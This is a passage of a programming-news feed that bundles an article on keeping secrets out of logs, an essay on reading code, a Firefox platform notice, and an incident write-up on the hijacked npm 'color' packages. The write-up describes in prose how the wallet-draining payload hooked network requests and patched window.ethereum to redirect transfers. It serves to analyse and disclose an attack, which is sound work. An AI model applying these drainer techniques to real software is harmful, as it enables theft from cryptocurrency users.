href="https://vector.dev">Vector</a> can receive and process logs from our microservices before dispatching them to DataDog or wherever logs end up. We can configure it to drop sensitive data in-place using many of the techniques we discussed before. And we can sample some subset of them and store them onto an S3 bucket, using a more powerful tool like <a href="https://github.com/trufflesecurity/trufflehog">Trufflehog</a> or an LLM to catch and verify secrets.</p><p>The idea here is to process logs streams before they&rsquo;re persisted. It doesn&rsquo;t need to be Vector, chances are, you already have this existing infrastructure that&rsquo;s used for deduping, aggregation, and dropping noisy debug logs. We can re-use it to prevent and detect secrets in logs. This pairs very well with sensitive data scanners that we discussed earlier, and might even unlock new ones you thought were out of reach.</p><h3>&#129464; People</h3><blockquote><p>&ldquo;Human practitioners are the adaptable element of complex systems. Practitioners and first line management actively adapt the system to maximize production and minimize accidents.&rdquo;</p><p>-<em>Richard Cook, <a href="https://how.complexsystems.fail/#12">https://how.complexsystems.fail/#12</a></em></p></blockquote><p>Our last stop is people. Modern software is a complex system. And while people will write the code that accidentally introduces sensitive data into logs, they&rsquo;re also the ones that will report, respond, and fix them. They&rsquo;ll build out the systems and infrastructure that will keep these complex systems safe. And early on in your maturity story and before you&rsquo;re able to build out secure-by-design frameworks, this is the lead bullet you&rsquo;ll most likely use the most.</p><p>The most important message I want to convey here is that your security team isn&rsquo;t alone, especially if you:</p><ul><li>educate your teammates on secure logging design</li><li>empower them to report and address these issues</li><li>and equip them with tools that get out of their way and helps them succeed.</li></ul><h3>Recap</h3><p>Alright, so we&rsquo;ve covered lead bullets that protect code, protect data, and protect logs:</p><ol><li>&#128208; Data architecture</li><li>&#127838; Data transformations</li><li>&#129704; Domain primitives</li><li>&#127873; Read-once objects</li><li>&#128451;&#65039; Log formatters</li><li>&#129514; Unit tests</li><li>&#128373;&#65039; Sensitive data scanners</li><li>&#129302; Log pre-processors</li><li>&#128270; Taint checking</li><li>&#129464; People</li></ol><p>Some of these might work for you, some of these won&rsquo;t, and some that we haven&rsquo;t even mentioned could be a homerun for you. Maybe you have super tight control over your log schemas or maybe you&rsquo;re using LLMs in a really neat and effective way. Or maybe you&rsquo;re building or using a language that has first class support for controlling secrets.</p><p>These worked for me. I have some personal opinions on ones which are foundational, some that are powerful in the long-run, and some that are really easy to get started. But your story is different, so I&rsquo;d like to zoom out and close out with a high-level, methodical strategy that you can apply for your security programs, and that we&rsquo;ll apply and walk through with an example.</p><h2>Strategy</h2><p>Here&rsquo;s <em>a</em> general strategy:</p><ol><li>Lay the foundation</li><li>Understand the data &#64258;ow</li><li>Protect at chokepoints</li><li>Apply defense-in-depth</li><li>Plan for response and recovery</li></ol><p>I&rsquo;m not shooting for a Nobel, here. You&rsquo;re probably doing some of these already, and chances are, you have some type of playbook or process that looks just like this. The key idea here is to not miss the forest for the trees, and use these explicit steps to place our efforts where they&rsquo;ll matter most. I&rsquo;ll walk you through a hypothetical system and we&rsquo;ll apply these in order.</p><h3>0. Lay the foundation</h3><p>Step zero is the foundation. Table stakes. This is like the base tier of Maslow&rsquo;s hierarchy, and we need these before we try anything else.</p><p>Developing expectations, culture, and support is a must-have. They&rsquo;re easy to ignore or forget about, but can make or break success. If you work at place that hasn&rsquo;t addressed these in the past, it can be quite jarring or difficult to shift that mentality.</p><center><img alt="Meme: high-fiving a drowning hand" src="https://allan.reyes.sh/img/ksool/high-five.jpg"></center><p>I don&rsquo;t have a ton of advice here other than making sure your org is aligned on this. It&rsquo;ll probably feel like it&rsquo;s getting worse before it&rsquo;s getting better, but that is a sign of progress. A great litmus test for a solid foundation is if developers will (or already have) come to you to report secrets they found in logs.</p><p>The second thing we&rsquo;ll need is to decide is what we consider a secret to begin with. I, admittedly, used secrets and sensitive data interchangeably. This may not be the case for you. It doesn&rsquo;t need to be perfect or comprehensive, and maybe it&rsquo;s just a framework. But employees, especially the security team, need common understanding.</p><p>The third item is technical. If our logs aren&rsquo;t structured or aren&rsquo;t JSON, it&rsquo;ll make this endeavor a lot more difficult. A lot of the techniques we discussed just won&rsquo;t work. If we don&rsquo;t have that central pipeline or there isn&rsquo;t <em>One and Only One Way</em> to both dispatch and view logs, we&rsquo;ll have to do a lot more lifting. We&rsquo;ve seen a few ways that logs bypass this, but having a central pipeline should cover most of the bases.</p><h3>1. Understand the data flow</h3><p>With the foundation laid, the next best thing to do is to understand and chart out how secrets flow through your system. This is basically a Data Flow Diagram, and we&rsquo;ll go through a fairly modest example.</p><center><img alt="A data flow diagram" src="https://allan.reyes.sh/img/ksool/dfd.jpg"></center><p>On the left, we have users that visit some type of single-page web app. Requests and data flow through an application load balancer to several web application services running in containers. This is our core compute and where all the application code runs. Let&rsquo;s assume that these are disparate microservices processing all types of data, some of which are considered secret. For the most sensitive data, they use KMS to encrypt and then store the ciphertext blobs in their respective database.</p><p>And then, applications use a standard logging library to emit to stdout, which gets shipped to CloudWatch and then forwarded to Datadog. That&rsquo;s the final stop, and that&rsquo;s where employees, devs, support staff, etc. can view them.</p><p>I highly recommend going through an exercise like this, because not only does it force you to understand the flows and boundaries of the system, if you spend time at each node and threat model it, you end up finding a bunch of unexpected ways and places that secrets make it into logs. For example&hellip;</p><ul><li>Front-end analytics! It turns out that secrets from things like form contents to session replays could end up getting sent to your user analytics platform.</li><li>And then what about our application load balancers? These ship their HTTP logs directly to CloudWatch, so we could be logging embedded secrets in URLs, and it&rsquo;s totally bypassing our application tiers.</li><li>Last surprise: error monitoring! Let&rsquo;s just say that some team wired up Sentry instead of DataDog for error monitoring, <em>because of course they did</em>, and now you have another stream of secrets in logs.</li></ul><center><img alt="An animated DFD with new flows" src="https://allan.reyes.sh/img/ksool/dfd.gif"></center><p>We could go further, and we haven&rsquo;t even drilled into application architecture, but I think this is a good time to move from discovery to action.</p><h3>2. Protect at chokepoints</h3><p>The next step we want to take is to protect the chokepoints. And if some flow isn&rsquo;t going through that chokepoint, like our rogue team that <em>yeeted</em> Sentry into prod, we fix it! We can get rid of Sentry and get that team onto the paved path of our logging pipeline.</p><p>We have a very clear chokepoint; a narrow path that most logs eventually flow through. Here&rsquo;s where most of our lead bullets should go.</p><center><img alt="Horziontally-aligned chokepoint" src="https://allan.reyes.sh/img/ksool/chokepoint1.jpg"></center><p>Here&rsquo;s that chokepoint splayed out. I also added an upstream node to represent CI/CD, because that&rsquo;s how code get into our apps. We can then put the bulk of our protective controls here on the critical path.</p><p>We can re-architect the app to use a single logging library and secure-by-default domain primitives. Then we could use those to build out and augment our static analysis, taint-checking, and unit tests. These give us a decent front-line defense for our logging pipeline.</p><h3>3. Apply defense-in-depth</h3><blockquote><p>&ldquo;Every preventative control should have a detective control at the same level and/or one level downstream in the architecture.&rdquo; -<em>Phil Venables, <a href="https://www.philvenables.com/post/defense-in-depth">https://www.philvenables.com/post/defense-in-depth</a></em></p></blockquote><p>The third step is about adding depth to that defense, a concept we&rsquo;re all familiar with. I really like how Phil Venables crystallizes what defense-in-depth means and I think he generally gives great advice. The idea is that our controls are not simply overlapping, but mutually supportive. Something&rsquo;s always got your back.</p><p>Along this chokepoint we add our downstream components, in depth. Some are preventative, while some are detective.</p><center><img alt="Horziontally-aligned chokepoint" src="https://allan.reyes.sh/img/ksool/chokepoint2.jpg"></center><p>We can add additional protections like tokenization and read-once objects. We can add the downstream tools like our custom log formatters, and employ various sensitive data scanners at different points. And then finally, we can educate and equip our team.</p><p>This is what defense-in-depth looks like to me, and I think this maximizes chances of success.</p><h3>4. Plan for response and recovery</h3><ul><li>Determine the scope</li><li>Restrict access</li><li>Stop the bleeding / &#64257;x the source</li><li>Clean up all the places, e.g. indexes</li><li>Restore access</li><li>Do a post-mortem</li><li>Make it ~impossible to happen again</li></ul><p>But, of course, if we do miss or if we manage to only detect vs. prevent, we should be prepared for response and recovery. You already know how to respond to incidents like this, so I won&rsquo;t add much here, other than making sure you&rsquo;re sticking to a playbook in the right order, pulling levers to restrict and restore access while you&rsquo;re responding, as well as thinking about all the weird places secrets might persist in logs, like indexes.</p><h2>Conclusion</h2><p>And that&rsquo;s it. This is the culmination of our strategy, our work, and about 30 some minutes of blabber.</p><center><img alt="Overlaid DFD w/ controls" src="https://allan.reyes.sh/img/ksool/final.jpg"></center><p>With a solid foundation and understanding of our data flows, we protected our chokepoints in-depth and kept secrets out of logs. We&rsquo;ve also introduced a lot of other strong primitives that materially improve our security program. So is that it? Is the job done?</p><p>Well, no, because the data team wired up some ETL jobs that are now spewing secrets into data lake logs, <em>because of course they did</em>.</p><center><img alt="Animated DFD with new data flow" src="https://allan.reyes.sh/img/ksool/final.gif"></center><p>Like most things in security, the job often isn&rsquo;t ever done. But we have the understanding, the tools, and a strategy to fight the next fight. Keeping secrets out of logs is in <em>your hands</em>.</p><center><img alt="Comedian pretending he has no hands" src="https://allan.reyes.sh/img/no-hands.gif"><br><i>*me</i></center><p>If you liked what you heard, or if you hated it, I&rsquo;d love to hear your story. Please, <a href="https://allan.reyes.sh/about/">reach out</a>! Thanks! &#9996;&#65039;</p></section> </section>]]></description><pubDate>Mon, 08 Sep 2025 23:50:46 +0530</pubDate></item><item><link>https://idiallo.com/blog/writing-code-is-easy-reading-is-hard</link><title>Writing Code Is Easy. Reading It Isn't (idiallo.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nbvfcs/writing_code_is_easy_reading_it_isnt/</guid><comments>https://www.reddit.com/r/programming/comments/1nbvfcs/writing_code_is_easy_reading_it_isnt/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 6 min | <a href='https://www.reddit.com/r/programming/comments/1nbvfcs/writing_code_is_easy_reading_it_isnt/'>Post permalink</a></p></section><section class='preview-image'><img src='https://cdn.idiallo.com/images/assets/548/thumb.jpg' /></section><section class='parsed-content'><div><p>Writing code is easy. Once you have a solution in mind, and have mastered the syntax of your favorite programming language, writing code is easy. Having an LLM write entire functions for you? Even easier. But the hard part isn&rsquo;t the writing. It&rsquo;s the reading. It&rsquo;s the time it takes to load the mental model of the system into your head. That&rsquo;s where all the cost really is.</p><p>A <strong>mental model</strong> is the thing you build when you read code. It&rsquo;s your internal map of how the system works, where the tricky parts are, what depends on what. Without it, you&rsquo;re just staring at lines of text.</p><p>When I worked as a contractor, most of my jobs started the same way. I&rsquo;d get a task to fix a bug or add a new feature in an application I&rsquo;d never seen before. My mental model was clean and empty at first. To start filling it, I&rsquo;d check the homepage to see what it looked like. I&rsquo;d look at the page source: is this React? jQuery? A third-party plugin? I&rsquo;d scan the codebase to see if the carousel they are requesting on the front page was used elsewhere. I&rsquo;d check their build process, their testing setup, the tools they leaned on. Every little detail I discovered got appended to the model in my head.</p><p>It was like moving into a new city. You start at the foot of your apartment, wander a few streets, notice which roads lead to the freeway, where the grocery store is, and slowly you start to orient yourself. That&rsquo;s what reading code feels like: you&rsquo;re building a mental map so you don&rsquo;t get lost every time you move around.</p><p>Say you need to understand a simple function like <code>getUserPreferences(userId)</code>. To build your mental model, you need to trace:</p><ul> <li>Where is this function defined?</li> <li>What does it return? Is it a Promise? What's the shape of the data?</li> <li>Does it hit a database directly or go through an API?</li> <li>Are there caching layers involved?</li> <li>What happens if the user doesn't exist?</li> <li>Who else calls this function and in what contexts?</li> <li>Are there side effects?</li> </ul><p>Understanding that one function means jumping between database schemas, API definitions, error handling middleware, and multiple call sites. Only after building this web of relationships do you have enough context to safely modify anything.</p><p>And it&rsquo;s slow. Reading code is harder than writing it. Much harder. Writing code is forward motion: you&rsquo;re laying down fresh pavement. Reading code means retracing someone else&rsquo;s steps, which usually means jumping between files, chasing function calls, inferring side effects, and deciphering intentions that aren&rsquo;t written down. Understanding one function often means looking at five other files. Only after all that do you have enough of a map to even begin.</p><p>It&rsquo;s the same reason debugging is harder than coding. On Stack Overflow, one of the most common comments you&rsquo;ll see under a bad question is: <em>&ldquo;Can you show us what you did?&rdquo;</em> Without seeing the steps, no one can load the right model in their head to help. It&rsquo;s also why the <a href="https://xyproblem.info/">XY problem</a> keeps coming up. People ask about a symptom without giving the context that would let others reconstruct the whole picture.</p><p>I'm still fascinated by the lawyer who used <a href="https://www.forbes.com/sites/mollybohannon/2023/06/08/lawyer-used-chatgpt-in-court-and-cited-fake-cases-a-judge-is-considering-sanctions/">ChatGPT in court</a>. He filed a brief that cited six cases which turned out not to exist. Everyone asked: why didn&rsquo;t he read them? The answer is the same: it takes time and effort to build the model. He would have had to chase down each case, read them, and slot them into a broader understanding of legal precedent. Reading is the hard part. Generating is easy.</p><p>Reading isn't just about going through the code and examining it line by line. It's also about going through the documentation, code reviews, and peer programming. In fact, these are solutions for accelerating the process of building our mental model. But with that in mind, you still have to, well, read and understand. You'll notice that programmers often want to rewrite things from scratch, because "the old code sucks". What sucks is taking the time to read and understand it.</p><p>And this is what makes LLMs both powerful and dangerous in programming. Whether the AI generates perfect code or complete hallucinations, you still have to read it. You still have to trace through what it&rsquo;s supposed to do, how it interacts with the rest of the system, and what the side effects are. The longer the generated code, the longer it takes to build your mental model. And only once you&rsquo;ve done that can you spot the issues, the places where the generated code doesn&rsquo;t quite fit, or quietly breaks something else.</p><p>When an LLM can produce an infinite amount of code or text, it tempts us to skip the reading. But you can&rsquo;t skip the model. You wouldn&rsquo;t want to load someone else&rsquo;s saved game and be dropped in the middle of a boss fight. That&rsquo;s what it feels like to inherit or generate code you don&rsquo;t understand.</p><p>This is why the real bottleneck in software development isn&rsquo;t writing, it&rsquo;s understanding.</p><hr><p>For now, we don't have the LLM equivalent for understanding. Something that could instantly transfer a complete mental model from the system to your head. Until we do, the bottleneck hasn't moved. We've solved the "typing speed" problem. We can generate more code than we could ever hope to read. But until we solve the "understanding" problem, the cost of software development remains the same: the time it takes for someone to make sense of it all.</p><p>This has real implications for how we use AI tools. Instead of asking AI to generate large blocks of code, we might be better off asking it to help us understand existing code. Instead of measuring productivity by lines of code written, we should measure it by how quickly teams can build accurate mental models of their systems.</p><p>The future of programming might not be about generating more code faster. It might be about generating understanding faster. And that's a much harder problem to solve.</p><hr> </div></section>]]></description><pubDate>Mon, 08 Sep 2025 23:48:00 +0530</pubDate></item><item><link>https://www.openmymind.net/Everything-Is-A-u8-array/</link><title>Everything is a []u8 (openmymind.net)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nbvest/everything_is_a_u8/</guid><comments>https://www.reddit.com/r/programming/comments/1nbvest/everything_is_a_u8/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p><a href='https://www.reddit.com/r/programming/comments/1nbvest/everything_is_a_u8/'>Post permalink</a></p></section>]]></description><pubDate>Mon, 08 Sep 2025 23:47:25 +0530</pubDate></item><item><link>https://blog.mozilla.org/futurereleases/2025/09/05/firefox-32-bit-linux-support-to-end-in-2026/</link><title>Firefox 32-bit Linux Support to End in 2026 (blog.mozilla.org)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nbv9xc/firefox_32bit_linux_support_to_end_in_2026/</guid><comments>https://www.reddit.com/r/programming/comments/1nbv9xc/firefox_32bit_linux_support_to_end_in_2026/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 2 min | <a href='https://www.reddit.com/r/programming/comments/1nbv9xc/firefox_32bit_linux_support_to_end_in_2026/'>Post permalink</a></p></section><section class='preview-image'><img src='https://blog.mozilla.org/futurereleases/files/2018/02/cropped-blog-header-future-releases.jpg' /></section><section class='parsed-content'><div><article><div><p>For many years, Mozilla has continued to provide Firefox for 32-bit Linux systems long after most other browsers and operating systems ended support. We made this choice because we care deeply about keeping Firefox available to as many people as possible, helping our users extend the life of their hardware and reduce unnecessary obsolescence.</p><p>Today, however, 32-bit Linux (on x86) is no longer widely supported by the vast majority of Linux distributions, and maintaining Firefox on this platform has become increasingly difficult and unreliable. To focus our efforts on delivering the best and most modern Firefox, we are <b>ending support for 32-bit x86 Linux</b> with the release of Firefox 144 (or to rephrase, Firefox 145 will not have 32-bit Linux support).</p><p>If you are currently using Firefox on a 32-bit x86 Linux system, we strongly encourage you to move to a 64-bit operating system and install the 64-bit version of Firefox, which will continue to be supported and updated.</p><p>For users who cannot transition immediately, Firefox ESR 140 will remain available &mdash; including 32-bit builds &mdash; and will continue to receive security updates until at least <b>September 2026</b>.</p><p>[Updated on 2025-09-09 to clarify the affected builds are 32-bit x86]</p></div></article> </div></section>]]></description><pubDate>Mon, 08 Sep 2025 23:42:28 +0530</pubDate></item><item><link>https://fasterthanli.me/articles/color-npm-package-compromised</link><title>Color NPM Package Compromised (fasterthanli.me)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nbv9w3/color_npm_package_compromised/</guid><comments>https://www.reddit.com/r/programming/comments/1nbv9w3/color_npm_package_compromised/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 16 min | <a href='https://www.reddit.com/r/programming/comments/1nbv9w3/color_npm_package_compromised/'>Post permalink</a></p></section><section class='preview-image'><img src='https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/_thumb~999ea46822417b69.png' /></section><section class='parsed-content'><div><p><span>Sep 08, 2025</span> <span> <abbr title="Estimated reading time, at 220 words per minute, where one word = 5 characters"> 4 min </abbr> </span> <span> <span><a href="https://fasterthanli.me/tags/npm">#npm</a></span> </span> </p><p>On September 8 2025, around 13:00 UTC, someone compromised <a href="https://www.npmjs.com/~qix">Josh Junon&rsquo;s npm account (qix)</a> and started publishing backdoored versions of his package.</p><p>Someone noticed and let Josh know:</p><figure><picture><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/charlie-noticed@2x~0ad954d4042cc44e.w400.jxl 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/charlie-noticed@2x~a5ec0b93bba7ec30.w800.jxl 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/charlie-noticed@2x~f4efba9875cd59ab.w900.jxl 1x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/charlie-noticed@2x~4a9e74f87760a4af.jxl 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/charlie-noticed@2x~4a9e74f87760a4af.jxl 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/charlie-noticed@2x~a77a052fa30939ec.w400.avif 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/charlie-noticed@2x~2c4593ff2e898847.w800.avif 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/charlie-noticed@2x~424c77cae67f76e3.w900.avif 1x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/charlie-noticed@2x~2a91320fae70db76.avif 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/charlie-noticed@2x~2a91320fae70db76.avif 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/charlie-noticed@2x~4b4a2f263f473471.w400.webp 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/charlie-noticed@2x~4b2488064d4e9adb.w800.webp 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/charlie-noticed@2x~ca45cce753873308.w900.webp 1x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/charlie-noticed@2x~33efd9d23f34908e.webp 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/charlie-noticed@2x~33efd9d23f34908e.webp 2x"><img src="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/charlie-noticed@2x~4a9e74f87760a4af.jxl" width="595" height="177" title alt="Hey. Your npm account seems to have been compromised. 1 hour ago it started posting packages with backdoors to all your popular packages. "></source></source></source></source></source></source></source></source></source></picture><figcaption><cite><a href="https://bsky.app/profile/charlieeriksen.bsky.social/post/3lydffcyulc2n%20">Charlie Eriksen on BlueSky </a></cite></figcaption> </figure><p>Josh confirmed he&rsquo;d gotten pwned by a fake 2FA (two-factor authentication) reset e-mail:</p><figure><picture><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/josh-fake-2fa@2x~a179783538de1f4d.w400.jxl 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/josh-fake-2fa@2x~7c915c01a7921e87.w800.jxl 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/josh-fake-2fa@2x~1a4695014120bb13.w900.jxl 1x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/josh-fake-2fa@2x~ca37f72d582a4442.jxl 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/josh-fake-2fa@2x~ca37f72d582a4442.jxl 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/josh-fake-2fa@2x~a8368bb997745224.w400.avif 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/josh-fake-2fa@2x~731a6e9261ec5aa6.w800.avif 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/josh-fake-2fa@2x~2ef1999737857730.w900.avif 1x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/josh-fake-2fa@2x~0625d89fd48a2fad.avif 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/josh-fake-2fa@2x~0625d89fd48a2fad.avif 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/josh-fake-2fa@2x~97b58ff0b566eb23.w400.webp 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/josh-fake-2fa@2x~ab64f921056092b7.w800.webp 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/josh-fake-2fa@2x~6f99f1fb2081d88c.w900.webp 1x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/josh-fake-2fa@2x~ff16c7198a608a53.webp 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/josh-fake-2fa@2x~ff16c7198a608a53.webp 2x"><img src="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/josh-fake-2fa@2x~ca37f72d582a4442.jxl" width="592" height="396" title alt="Yep, I've been pwned. 2FA reset email, looked very legitimate. Only NPM affected. I've sent an email off to @npmjs.bsky.social to see if I can get access again. Sorry everyone, I should have paid more attention. Not like me; have had a stressful week. Will work to get this cleaned up. "></source></source></source></source></source></source></source></source></source></picture><figcaption><cite><a href="https://bsky.app/profile/bad-at-computer.bsky.social/post/3lydioq5swk2y%20">Josh Junon on BlueSky </a></cite></figcaption> </figure><p>The phishing e-mail came from <code>npmsj.help</code> (registered 3 days prior) and claimed users had to reset their 2FA:</p><figure><picture><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/phishing-email~043bc42a26dd4329.w400.jxl 1x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/phishing-email~335445f45f56de09.jxl 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/phishing-email~335445f45f56de09.jxl 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/phishing-email~13cd7cd41ec06bdb.w400.avif 1x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/phishing-email~66555f22b3ea4c6f.avif 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/phishing-email~66555f22b3ea4c6f.avif 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/phishing-email~4f142a1c7ef38fc8.w400.webp 1x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/phishing-email~e6efbb081147cfbe.webp 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/phishing-email~e6efbb081147cfbe.webp 2x"><img src="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/phishing-email~335445f45f56de09.jxl" width="783" height="895" title="The 2FA phishing e-mail " alt="Hi, gix! As part of our ongoing commitment to account security, we are requesting that all users update their Two-Factor Authentication (2FA) credentials. Our records indicate that it has been over 12 months since your last 2FA update. | To maintain the security and integrity of your account, we kindly ask that you complete this update at your earliest convenience. Please note that accounts with outdated 2FA credentials will be temporarily locked starting September 10, 2025, to prevent unauthorized access. Update 2FA Now "></source></source></source></source></source></source></picture><figcaption><p>The 2FA phishing e-mail</p><cite><a href="https://news.ycombinator.com/item?id=45170070%20">junon on HN </a></cite></figcaption> </figure><p>The <a href="https://gist.github.com/Qix-/c1f0d4f0d359dffaeec48dbfa1d40ee9/">raw email</a> is available for the curious &mdash; it looks like it was sent via <a href="https://mailtrap.io/">mailtrap</a> (I&rsquo;ve sent them an e-mail about it).</p><p>Over on Mastodon, Kevin Beaumont provided <a href="https://cyberplace.social/@GossiTheDog/115169390397282254">a list of affected packages</a>:</p><figure><picture><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/gossi-list-of-pkgs@2x~fa84ac1945dcaa2f.w400.jxl 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/gossi-list-of-pkgs@2x~178d237f446798e5.w800.jxl 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/gossi-list-of-pkgs@2x~61a72ac780288b48.w900.jxl 1x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/gossi-list-of-pkgs@2x~3a16d2da11dfcac5.jxl 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/gossi-list-of-pkgs@2x~3a16d2da11dfcac5.jxl 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/gossi-list-of-pkgs@2x~2e67bd310f3ccf34.w400.avif 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/gossi-list-of-pkgs@2x~379e95c920fab669.w800.avif 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/gossi-list-of-pkgs@2x~a8f4e7fc62452e1b.w900.avif 1x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/gossi-list-of-pkgs@2x~8d544b6cfdc992a6.avif 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/gossi-list-of-pkgs@2x~8d544b6cfdc992a6.avif 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/gossi-list-of-pkgs@2x~c17402d6f0f5cf8d.w400.webp 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/gossi-list-of-pkgs@2x~550e7cd5380d4848.w800.webp 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/gossi-list-of-pkgs@2x~b896fd52cf1cec16.w900.webp 1x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/gossi-list-of-pkgs@2x~9bdc0e2b81b4c538.webp 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/gossi-list-of-pkgs@2x~9bdc0e2b81b4c538.webp 2x"><img src="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/gossi-list-of-pkgs@2x~3a16d2da11dfcac5.jxl" width="637" height="444" title alt=" Kevin Beaumont GossiTheDog@cyberplace.social Malicious javascript compromise on npmjs.com These packages, about a billion downloads prior supports-hyperlinks chalk-template simple-swizzle slice-ansi error-ex is-arrayish wrap-ansi backslash color-string color-convert color color-name Thread follows. "></source></source></source></source></source></source></source></source></source></picture><figcaption><cite><a href="https://cyberplace.social/@GossiTheDog/115169390397282254%20">Kevin Beaumont on Mastodon </a></cite></figcaption> </figure><p>And pointed out the scale of the attack: <code>color</code> alone has ~32 million weekly downloads:</p><a href="https://fasterthanli.me#the-payload"><h2>The payload</h2></a><p>The complete payload is <a href="https://pastebin.com/bwLZrq02">available on pastebin</a>.</p><p>According to <a href="https://github.com/chalk/chalk/issues/656#issuecomment-3266900029">initial analysis</a>, it appears it&rsquo;s not meant to be running in a server environment, or on developers&rsquo; machines (in other words, not in nodejs/bun/etc.), but in the browser.</p><p>Which would mean that for the attack to be successful:</p><ul><li>Someone maintaining a crypto website/web-powered app would have to upgrade to the backdoored dependencies</li> <li>Those dependencies would have to be used on the front-end</li> <li>The crypto website would have had to be built, packaged, deployed</li> <li>Users of the website would&rsquo;ve had to make transactions with the drainer active</li> </ul><p>In other terms, I <em>think</em> that if all people did was accept a PR that bumped some dependencies, and some tests ran in CI, then nothing bad has happened, yet. But people are still figuring out exactly what the payload is supposed to do, and all the affected packages.</p><p>De-obfuscating the payload through <a href="https://obf-io.deobfuscate.io/">https://obf-io.deobfuscate.io/</a> yields good results, see <a href="https://gist.github.com/fasterthanlime/eba5b06c9cf2b39a525c51ae41ffcc00">this gist</a>.</p><p>I went a step further and did a <a href="https://github.com/fasterthanlime/0x112">loose port to TypeScript</a> to understand more of what&rsquo;s going on.</p><p>In short, <code>fetch</code> and <code>XMLHTTPRequest</code> are hooked so that any crypto addresses found in the response body that look like Bitcoin, Solana, Litecoin v2 etc. are modified to be one <a href="https://github.com/fasterthanlime/0x112/blob/main/consts.ts">of the many addresses controlled by the attacker</a>.</p><p>Note that only the response body is modified, not the request body. Presumably&hellip; this targets API calls that would request which address to send funds to, and do the transfer through some other means?</p><p>Additionally, every 500ms up to 50 times, <code>window.ethereum.request</code> is called to see if any Ethereum accounts have been authorized for use with <a href="https://docs.metamask.io/wallet/reference/provider-api">Metamask</a>. If so, <code>window.ethereum</code> is monkey-patched to alter various transactions to go attacker-controlled addresses.</p><p>In particular, it looks for:</p><ul><li><code>approve(address,uint256)</code> (0x095ea7b3) &mdash; replacing the destination &amp; maxing out the amount<ul><li>this codepath also logs the DEX name if known: Uniswap, PancakeSwap, 1inch, SushiSwap</li> </ul> </li> <li><code>permit(address,address,uint256,uint256,uint8,bytes32,bytes32)</code> (0xd505accf) &mdash; replacing the destination &amp; maxing out the value</li> <li><code>transfer(address,uint256)</code> (0xa9059cbb) &mdash; replacing the destination but keeping the amount</li> <li><code>transferFrom(address,address,uint256)</code> (0x23b872dd) &mdash; replacing the destination but keeping the 